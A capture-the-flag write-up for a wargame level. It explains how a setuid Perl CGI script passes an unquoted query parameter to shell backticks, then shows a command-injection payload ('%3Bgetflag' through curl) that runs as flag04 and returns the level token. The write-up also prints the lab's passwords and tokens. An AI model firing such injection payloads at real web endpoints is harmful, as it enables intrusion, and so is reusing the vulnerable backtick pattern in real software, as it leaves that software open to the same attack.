# level04

A Perl CGI script from the era when "just shell out to echo" was considered a reasonable way to print a string. It takes your input and feeds it to a shell. You can see where this is going :)

| | |
| --- | --- |
| **Login** | `level04` / `qi0maab88jeaj46qoumi7maus` (the flag03 token) |
| **flag04 password** | n/a (the CGI runs as flag04; we inject a command into it) |
| **flag04 token** | `ne2searoevaevoem4ov4ar8ap` (aka the level05 password) |

## poking around

Home has a Perl script, setuid flag04:

```bash
$ ls -l ~/level04.pl
-rwsr-sr-x 1 flag04 level04 152 Mar  5 2016 level04.pl
```

`find / -user flag04` also places it under `/var/www/level04/`, and the header comment says `localhost:4747`. So it's a CGI served by a webserver, and the webserver runs it as flag04 (hopefully it's not tlonghin's webserv, lol).

## the script

```perl
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

The whole thing: take the `x` query parameter, drop it unquoted into `` `echo $y` ``, and run that in a shell. Backticks in Perl mean "run this command line and capture the output", so our input is already inside a live shell. There is no escaping, no validation, nothing. Textbook command injection.

## the injection

We want the shell to run `echo <stuff>` and then `getflag`. A `;` ends the first command and starts a second:

```
echo ; getflag
      ^ our injected command, running as flag04
```

The one catch: a raw `;` in a URL is a query-string separator, so CGI chops it off before Perl ever sees it. URL-encode it (`%3B`) or let curl encode it for you:

```bash
$ curl -s "http://localhost:4747/?x=%3Bgetflag"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

# equivalent, lets curl handle the encoding:
$ curl -s -G http://localhost:4747/ --data-urlencode 'x=;getflag'
```

Backticks work too (`x=`getflag``), since command substitution runs inside the same shell. Either way `getflag` runs as flag04 and reads us the token.
